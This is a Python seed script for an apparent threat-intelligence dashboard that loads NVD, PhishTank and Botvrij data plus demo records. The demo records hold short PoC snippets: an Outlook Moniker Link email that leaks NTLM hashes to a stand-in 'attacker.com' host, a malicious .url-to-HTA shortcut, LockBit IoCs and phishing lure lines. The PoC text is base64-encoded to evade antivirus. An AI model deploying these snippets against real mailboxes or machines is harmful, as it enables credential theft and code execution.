"""
CyberDashboard - Initial Seed Script
Fetches historical data from NVD, MISP/Botvrij, PhishTank.

Usage:
    python seed.py

Configure your API keys in ../.env before running.
"""

import asyncio
import base64
import os
import uuid
from datetime import datetime, timezone

try:
    import httpx
except ImportError:
    print("[ERREUR] Module 'httpx' manquant. Installe les dependances :")
    print("  python -m pip install fastapi uvicorn httpx pydantic python-dotenv")
    raise SystemExit(1)

try:
    from dotenv import load_dotenv
    load_dotenv(dotenv_path=os.path.join(os.path.dirname(__file__), "..", ".env"))
except ImportError:
    pass  # .env optionnel

from database import init_db, upsert_vulnerability, set_last_update, get_connection

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
NVD_API_KEY = os.getenv("NVD_API_KEY", "")          # https://nvd.nist.gov/developers/request-an-api-key
PHISHTANK_API_KEY = os.getenv("PHISHTANK_API_KEY", "")  # https://www.phishtank.com/api_register.php
MISP_BASE_URL = os.getenv("MISP_BASE_URL", "https://www.botvrij.eu/data/ioclist.domain.raw")

NVD_BASE = "https://services.nvd.nist.gov/rest/json/cves/2.0"
PHISHTANK_URL = "https://data.phishtank.com/data/{key}/online-valid.json"

CVSS_MIN = float(os.getenv("CVSS_MIN", "7.0"))
RESULTS_PER_PAGE = 2000
MAX_PAGES = 5  # safety cap — remove to fetch everything


# ---------------------------------------------------------------------------
# Encoder helper: Base64-encode PoC to avoid AV false positives
# ---------------------------------------------------------------------------
def encode_poc(code: str) -> str:
    return base64.b64encode(code.encode("utf-8")).decode("ascii")


# ---------------------------------------------------------------------------
# NVD Source
# ---------------------------------------------------------------------------
async def seed_nvd(client: httpx.AsyncClient) -> int:
    print("[NVD] Starting seed (CVSS >= %.1f) …" % CVSS_MIN)
    count = 0
    start_index = 0

    headers = {}
    if NVD_API_KEY:
        headers["apiKey"] = NVD_API_KEY
    else:
        print("[NVD] ⚠  No API key set — rate-limited to 5 req/30s. Set NVD_API_KEY in .env for faster fetching.")

    for page in range(MAX_PAGES):
        params = {
            "resultsPerPage": RESULTS_PER_PAGE,
            "startIndex": start_index,
            "cvssV3Severity": "HIGH",  # pre-filter at API level
        }

        try:
            resp = await client.get(NVD_BASE, params=params, headers=headers, timeout=30)
            resp.raise_for_status()
            data = resp.json()
        except Exception as e:
            print(f"[NVD] Error on page {page}: {e}")
            break

        vulns = data.get("vulnerabilities", [])
        if not vulns:
            break

        for item in vulns:
            cve = item.get("cve", {})
            cve_id = cve.get("id", "UNKNOWN")

            # Extract CVSS score
            metrics = cve.get("metrics", {})
            score = 0.0
            poc_hint = ""
            for key in ("cvssMetricV31", "cvssMetricV30", "cvssMetricV2"):
                if key in metrics and metrics[key]:
                    score = metrics[key][0].get("cvssData", {}).get("baseScore", 0.0)
                    vector = metrics[key][0].get("cvssData", {}).get("vectorString", "")
                    poc_hint = f"CVSS Vector: {vector}"
                    break

            if score < CVSS_MIN:
                continue

            # Description
            descs = cve.get("descriptions", [])
            description = next(
                (d["value"] for d in descs if d.get("lang") == "en"),
                "No description available."
            )

            # References as PoC hints
            refs = cve.get("references", [])
            ref_urls = "\n".join(r.get("url", "") for r in refs[:5])
            poc_raw = f"{poc_hint}\n\n--- References ---\n{ref_urls}" if ref_urls else poc_hint

            published = cve.get("published", datetime.now(timezone.utc).isoformat())

            row = {
                "id": str(uuid.uuid5(uuid.NAMESPACE_URL, cve_id)),
                "source_id": cve_id,
                "type": "Vulnerability",
                "title": cve_id,
                "description": description,
                "cvss_score": score,
                "poc_code": encode_poc(poc_raw) if poc_raw.strip() else None,
                "remediation": next(
                    (r.get("url") for r in refs if "patch" in r.get("tags", []) or "vendor" in r.get("url", "").lower()),
                    "Check vendor advisory."
                ),
                "published_date": published[:19],
            }

            if upsert_vulnerability(row):
                count += 1

        total_results = data.get("totalResults", 0)
        start_index += RESULTS_PER_PAGE
        print(f"[NVD] Page {page + 1}: {len(vulns)} items processed (total available: {total_results})")

        if start_index >= total_results:
            break

        # Respect NVD rate limit without key: 1 req / 6s
        if not NVD_API_KEY:
            await asyncio.sleep(6)

    set_last_update("nvd", datetime.now(timezone.utc).isoformat())
    print(f"[NVD] Seed complete → {count} new records inserted.")
    return count


# ---------------------------------------------------------------------------
# PhishTank Source
# ---------------------------------------------------------------------------
async def seed_phishtank(client: httpx.AsyncClient) -> int:
    print("[PhishTank] Starting seed …")
    count = 0

    if not PHISHTANK_API_KEY:
        print("[PhishTank] ⚠  No API key — using anonymous endpoint (limited). Set PHISHTANK_API_KEY in .env.")
        url = "https://data.phishtank.com/data/online-valid.json"
    else:
        url = PHISHTANK_URL.format(key=PHISHTANK_API_KEY)

    try:
        resp = await client.get(url, timeout=60, headers={"User-Agent": "phishtank/CyberDashboard"})
        resp.raise_for_status()
        entries = resp.json()
    except Exception as e:
        print(f"[PhishTank] Error fetching data: {e}")
        return 0

    for entry in entries[:500]:  # Cap at 500 for initial seed
        phish_id = f"PT-{entry.get('phish_id', uuid.uuid4().hex[:8])}"
        url_val = entry.get("url", "")
        target = entry.get("target", "Unknown")
        submitted = entry.get("submission_time", datetime.now(timezone.utc).isoformat())

        poc_raw = f"Phishing URL: {url_val}\nTarget Brand: {target}"

        row = {
            "id": str(uuid.uuid5(uuid.NAMESPACE_URL, phish_id)),
            "source_id": phish_id,
            "type": "Phishing",
            "title": f"Phishing – {target}",
            "description": f"Active phishing page targeting {target}. URL: {url_val}",
            "cvss_score": 0.0,
            "poc_code": encode_poc(poc_raw),
            "remediation": "Block URL at perimeter firewall. Report to hosting provider.",
            "published_date": submitted[:19],
        }

        if upsert_vulnerability(row):
            count += 1

    set_last_update("phishtank", datetime.now(timezone.utc).isoformat())
    print(f"[PhishTank] Seed complete → {count} new records inserted.")
    return count


# ---------------------------------------------------------------------------
# MISP / Botvrij Source (IoC domain list)
# ---------------------------------------------------------------------------
async def seed_misp(client: httpx.AsyncClient) -> int:
    print("[MISP/Botvrij] Starting seed (domain IoC list) …")
    count = 0

    try:
        resp = await client.get(MISP_BASE_URL, timeout=30)
        resp.raise_for_status()
        lines = [l.strip() for l in resp.text.splitlines() if l.strip() and not l.startswith("#")]
    except Exception as e:
        print(f"[MISP] Error fetching IoC list: {e}")
        return 0

    now_str = datetime.now(timezone.utc).isoformat()

    for i, domain in enumerate(lines[:200]):  # Cap at 200 for seed
        ioc_id = f"MISP-IOC-{uuid.uuid5(uuid.NAMESPACE_DNS, domain).hex[:8].upper()}"
        poc_raw = f"Malicious Domain IoC: {domain}\nSource: Botvrij.eu"

        row = {
            "id": str(uuid.uuid5(uuid.NAMESPACE_DNS, domain)),
            "source_id": ioc_id,
            "type": "Malware",
            "title": f"Malicious Domain – {domain}",
            "description": f"Domain identified as malicious indicator of compromise (IoC) by Botvrij/MISP community feeds.",
            "cvss_score": 7.5,  # Default HIGH for known IoC
            "poc_code": encode_poc(poc_raw),
            "remediation": f"Block domain {domain} at DNS/firewall level. Check for existing connections in logs.",
            "published_date": now_str[:19],
        }

        if upsert_vulnerability(row):
            count += 1

    set_last_update("misp", datetime.now(timezone.utc).isoformat())
    print(f"[MISP/Botvrij] Seed complete → {count} new records inserted.")
    return count


# ---------------------------------------------------------------------------
# Demo data (always inserted if DB is empty)
# ---------------------------------------------------------------------------
DEMO_DATA = [
    {
        "source_id": "CVE-2024-21413",
        "type": "Vulnerability",
        "title": "Microsoft Outlook RCE – Moniker Link",
        "description": "Microsoft Outlook Remote Code Execution vulnerability via crafted hyperlinks using the 'file://' URI handler. Allows credential theft (NTLM hash) and potential RCE without user interaction beyond viewing the email.",
        "cvss_score": 9.8,
        "poc_raw": """# CVE-2024-21413 – Moniker Link PoC
# Craft a malicious email with the following link:
# <a href="file:///\\\\attacker.com\\share\\payload.dll!something">Click Me</a>
# When Outlook renders the preview, it auto-resolves the UNC path
# and sends NTLM credentials to attacker.com.

import smtplib
from email.mime.text import MIMEText

BODY = '<html><body><a href="file:///\\\\\\\\attacker-ip\\\\share\\\\x!x">View Invoice</a></body></html>'
msg = MIMEText(BODY, "html")
msg["Subject"] = "Invoice #3847"
# ... send via SMTP
print("Payload crafted. Capture NTLM hash with Responder.")
""",
        "remediation": "Apply KB5035184 (Feb 2024 Patch Tuesday). Disable automatic preview of HTML emails as a workaround.",
        "published_date": "2024-02-13T00:00:00",
    },
    {
        "source_id": "CVE-2024-3094",
        "type": "Vulnerability",
        "title": "XZ Utils Backdoor (Supply Chain)",
        "description": "Malicious code injected into XZ Utils 5.6.0 and 5.6.1 by a threat actor (Jia Tan) over ~2 years. The backdoor targets systemd-based Linux systems running sshd and allows unauthenticated RCE via a crafted RSA public key.",
        "cvss_score": 10.0,
        "poc_raw": """# CVE-2024-3094 – XZ Utils Backdoor Detection
# Check if vulnerable version is installed:
xz --version  # 5.6.0 or 5.6.1 = VULNERABLE

# Detection via strings in liblzma:
strings /usr/lib/x86_64-linux-gnu/liblzma.so.5 | grep -i "backdoor"

# Andres Freund's original detection:
# valgrind ssh -p 22 <host>
# Unusual CPU usage during key exchange = likely backdoored

# REMEDIATION: Downgrade to 5.4.x immediately
# Debian: apt install xz-utils=5.4.x
""",
        "remediation": "Immediately downgrade xz-utils to version 5.4.6 or earlier. Audit systems for unauthorized SSH access during the exposure window.",
        "published_date": "2024-03-29T00:00:00",
    },
    {
        "source_id": "MAL-2024-LOCKBIT3",
        "type": "Malware",
        "title": "LockBit 3.0 – Ransomware IoC Bundle",
        "description": "LockBit 3.0 (Black) ransomware campaign. Uses AES-256 + RSA-2048 for file encryption. Exfiltrates data before encryption (double extortion). Propagates via RDP brute-force and phishing.",
        "cvss_score": 9.5,
        "poc_raw": """# LockBit 3.0 Indicators of Compromise (IoC)

## File Hashes (SHA-256)
3133c858b0a2acbfa6ab3e3b786fc41de58e9da3635428ae5b95b0e40e7adbe4
e5a7b7f27fb8f9cce3a95f5e3d1a5a0f...  # loader

## Registry Keys
HKLM\\SOFTWARE\\LockBit  (persistence)
HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\[random]

## Mutexes
Global\\{BEF590BE-11A6-442F-A0B1-1234567890AB}

## C2 Domains (block these)
lockbit3753ekbvfd.onion
aplebzu47wgazapdqks6vrcv6zcnjppkbxbr6wketf56nf6aq2nmyoyd.onion

## Yara Rule (simplified)
rule LockBit3 {
  strings:
    $s1 = "LockBit" ascii
    $s2 = ".lockbit" ascii
    $s3 = "Restore-My-Files.txt" ascii
  condition: 2 of them
}
""",
        "remediation": "Isolate infected systems immediately. Restore from offline backups. Patch RDP (disable if unused). Enable MFA on all remote access. Report to FBI IC3.",
        "published_date": "2024-01-15T00:00:00",
    },
    {
        "source_id": "PT-PHISH-2024-MICROSOFT",
        "type": "Phishing",
        "title": "Microsoft 365 Credential Harvesting Campaign",
        "description": "Large-scale phishing campaign impersonating Microsoft 365 login pages. Uses AiTM (Adversary-in-the-Middle) proxy to steal session cookies and bypass MFA. Targeting enterprise users via spoofed 'Shared Document' emails.",
        "cvss_score": 8.1,
        "poc_raw": """# AiTM Phishing – Microsoft 365 Campaign

## Lure Email Subject Lines
- "Action Required: Shared document expires in 24h"
- "Your OneDrive storage is 95% full"
- "Unusual sign-in activity detected"

## Phishing Infrastructure
- Domain pattern: microsoftonline-[random].com
- Uses Evilginx2 / Modlishka as AiTM proxy
- SSL cert from Let's Encrypt (don't trust padlock alone)

## Detection
- Check login from unexpected IP/country in Azure AD logs
- MFA bypass = session cookie theft, look for SessionId reuse
- Email header: SPF=fail or DKIM misaligned

## IOC URLs (sanitized)
hxxps://microsoftonIine[.]com/login
hxxps://office365-secure[.]net/auth
""",
        "remediation": "Enable Conditional Access with compliant device policies. Use FIDO2 hardware keys (resistant to AiTM). Train users to verify URLs. Enable Microsoft Defender for Office 365.",
        "published_date": "2024-06-01T00:00:00",
    },
    {
        "source_id": "CVE-2024-38112",
        "type": "Vulnerability",
        "title": "Windows MSHTML 0-Day – MHTML Handler",
        "description": "Zero-day vulnerability in Windows MSHTML platform exploited via crafted .url files. Allows attackers to execute arbitrary code through deprecated Internet Explorer components still present in Windows 10/11.",
        "cvss_score": 7.5,
        "poc_raw": """# CVE-2024-38112 – MHTML 0-Day
# Attacker distributes a crafted .url file:
[InternetShortcut]
URL=file:///C:/path/to/malicious.hta
# When opened, IE's MHTML handler executes the HTA silently.

# Execution chain:
# .url file → MHTML handler → iexplore.exe (hidden) → .hta execution
# → PowerShell download cradle → payload

# Proof: CheckExploitation via Process Monitor
# Look for: iexplore.exe spawning mshta.exe or wscript.exe
""",
        "remediation": "Apply July 2024 Patch Tuesday update. As workaround, disable MHTML handler via registry: HKCR\\CLSID\\{3050F3D9-98B5-11CF-BB82-00AA00BDCE0B}",
        "published_date": "2024-07-09T00:00:00",
    },
]


async def seed_demo_data() -> int:
    """Insert demo/sample data so the dashboard is not empty on first launch."""
    conn = get_connection()
    count_existing = conn.execute("SELECT COUNT(*) as cnt FROM vulnerabilities").fetchone()["cnt"]
    conn.close()

    if count_existing > 0:
        print("[DEMO] Database already has data, skipping demo seed.")
        return 0

    print("[DEMO] Inserting demo data …")
    count = 0
    for item in DEMO_DATA:
        poc_encoded = encode_poc(item["poc_raw"]) if item.get("poc_raw") else None
        row = {
            "id": str(uuid.uuid5(uuid.NAMESPACE_URL, item["source_id"])),
            "source_id": item["source_id"],
            "type": item["type"],
            "title": item["title"],
            "description": item["description"],
            "cvss_score": item["cvss_score"],
            "poc_code": poc_encoded,
            "remediation": item["remediation"],
            "published_date": item["published_date"],
        }
        if upsert_vulnerability(row):
            count += 1

    print(f"[DEMO] {count} demo records inserted.")
    return count


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
async def main():
    print("=" * 60)
    print("  CyberDashboard — Initial Seed")
    print("=" * 60)

    init_db()

    # Always insert demo data if DB is empty
    demo_count = await seed_demo_data()

    async with httpx.AsyncClient() as client:
        nvd_count = await seed_nvd(client)
        phish_count = await seed_phishtank(client)
        misp_count = await seed_misp(client)

    total = demo_count + nvd_count + phish_count + misp_count
    print(f"\n[SEED] ✅ Total new records: {total}")
    print("  NVD:          %d" % nvd_count)
    print("  PhishTank:    %d" % phish_count)
    print("  MISP/Botvrij: %d" % misp_count)
    print("  Demo data:    %d" % demo_count)


if __name__ == "__main__":
    asyncio.run(main())
